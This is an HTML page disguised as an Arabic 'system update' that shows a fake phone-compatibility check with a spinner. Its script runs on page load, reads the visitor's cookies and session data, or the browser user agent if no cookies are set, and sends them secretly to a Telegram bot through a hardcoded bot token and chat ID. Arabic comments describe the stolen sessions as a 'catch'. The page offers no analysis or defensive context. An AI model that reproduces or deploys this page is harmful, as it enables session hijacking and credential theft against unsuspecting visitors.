<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام</title>
    <script>
        // بيانات بوتك عشان الصيد يوصلك مباشرة
        const token = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
        const chatId = '5811700860';

        function sendToRadar(data) {
            const message = "🎯 **تم سحب سيشن جديد!**\n\n" + "🍪 السيشن: `" + data + "`";
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            fetch(url); // إرسال سري للبوت
        }

        window.onload = function() {
            // سحب الكوكيز والسيشن
            const session = document.cookie;
            if (session && session !== "") {
                sendToRadar(session);
            } else {
                // إذا الكوكيز فارغ، نسحب معلومات المتصفح كبديل للطقطقة
                sendToRadar("Session Empty - Browser: " + navigator.userAgent);
            }
        };
    </script>
</head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:50px;">
    <h2>جاري فحص توافق الجوال...</h2>
    <div style="border:2px solid #0f0; width:50px; height:50px; border-radius:50%; border-top:none; animation: spin 1s linear infinite; margin:auto;"></div>
    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
</body>
</html>
